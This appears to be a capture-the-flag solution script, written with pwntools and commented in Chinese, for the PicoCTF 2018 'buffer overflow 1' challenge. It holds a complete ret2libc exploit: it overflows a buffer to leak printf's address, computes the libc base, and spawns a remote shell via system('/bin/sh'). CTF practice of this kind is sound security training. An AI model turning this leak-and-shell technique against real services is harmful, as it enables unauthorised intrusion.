'''
@Author       : 白银
@Date         : 2023-05-13 09:06:09
@LastEditors  : 白银
@LastEditTime : 2023-05-13 10:28:36
@FilePath     : /pwn/PicoCTF_2018_buffer_overflow_1.py
@Description  : https://buuoj.cn/challenges#picoctf_2018_buffer%20overflow%201
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
from libcfind import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './PicoCTF_2018_buffer_overflow_1'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 26980)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        # libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/2.27x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    # libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x2c # ida看，s上限和r差多少
printf_plt = elf.plt['printf']
print("printf_plt------", hex(printf_plt))
printf_got = elf.got['printf']
print("printf_got------", hex(printf_got))
return_addr = elf.symbols['main']
print("return_addr------", hex(return_addr))
# return_addr = 0x804844b

payload = flat(['a' * padding ,printf_plt, return_addr, printf_got])
io.recvuntil("Please enter your string: \n")
io.sendline(payload)

io.recvuntil('0x8048420\n')

printf_addr = u32(io.recv(4))# x86一个指针占4字节
print("printf_addr------", hex(printf_addr))
    
libc = finder('printf', printf_addr)
libc_base = printf_addr - libc.dump('printf')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
# bin_sh_addr = 0x80487C3 # 直接用程序的sh字符，他会将shell字符整个发过去

payload2 = flat(['a' * padding, system_addr, 0xdeadbeef, bin_sh_addr]) # x86在函数和参数之间要占位符

io.sendline(payload2)

io.interactive()